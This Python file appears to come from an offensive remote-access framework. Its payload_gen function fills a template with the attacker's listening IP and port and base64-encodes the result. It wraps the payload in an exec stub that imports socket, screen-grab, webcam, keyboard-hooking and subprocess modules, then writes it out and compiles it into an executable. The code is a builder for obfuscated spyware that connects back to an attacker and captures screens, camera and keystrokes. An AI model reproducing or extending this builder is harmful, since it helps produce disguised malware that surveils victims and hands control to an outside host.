import os
import platform
from base64 import b64encode
from Lib.Debugger import info, error
from .compile_utils import compile_payload
import importlib

def _load_template(exploit_path) -> str:
    path = os.path.join(exploit_path, "_NCEXPlib", "Template.py")
    with open(path, "r") as f:
        return f.read()

def _load_imports(exploit_path) -> str:
    path = os.path.join(exploit_path, "_NCEXPlib", "imports.py")
    with open(path, "r") as f:
        return f.read()

def payload_gen(self, command) -> None:
    if not self.EXPLOIT == None:
        parts = command.split()
        if len(parts) < 2:
            error("Please specify a file name")
            return
        if len(parts) < 3:
            error("Please specify an os: W(windows), L(linux), RW(Raw Windows) or RL(Raw Linux)")
            return

        imports: str = ""
        if parts[2].lower() in ["w", "rw"]:
            imports = _load_imports(self.EXPLOIT)

        payload: str = _load_template(self.EXPLOIT)

        final_payload: str = (
            payload
            .replace("{{ip}}", self.LHOST)
            .replace("{{port}}", str(self.LPORT))
            .replace("{{imports}}", str(imports))
        )

        if not parts[2].lower().startswith("r"):
            final_payload = b64encode(final_payload.encode()).decode()
            final_payload = f"""\
from base64 import b64decode
import socket
import os
import sys
from PIL import ImageGrab
import io
import pickle
import cv2
import keyboard
import subprocess

exec(b64decode(b'{final_payload}').decode())
"""

        name: str = parts[1]
        with open(f"{name}.py", "w") as f:
            f.write(final_payload)

        if not parts[2].lower().startswith("r"):
            compile_payload(self, name, imports)

def get_payload(payload) -> any:
    if not os.path.exists(f"{payload}.py"):
        return False

    module_name = payload.replace("/", ".")
    parts = module_name.split(".")
    class_name = parts[-1]

    try:
        module = importlib.import_module(module_name)
        payload_class = getattr(module, class_name)
        clientpayload = payload_class()
        return clientpayload
    except Exception as e:
        print(f"Failed to load payload: {e}")
        return False
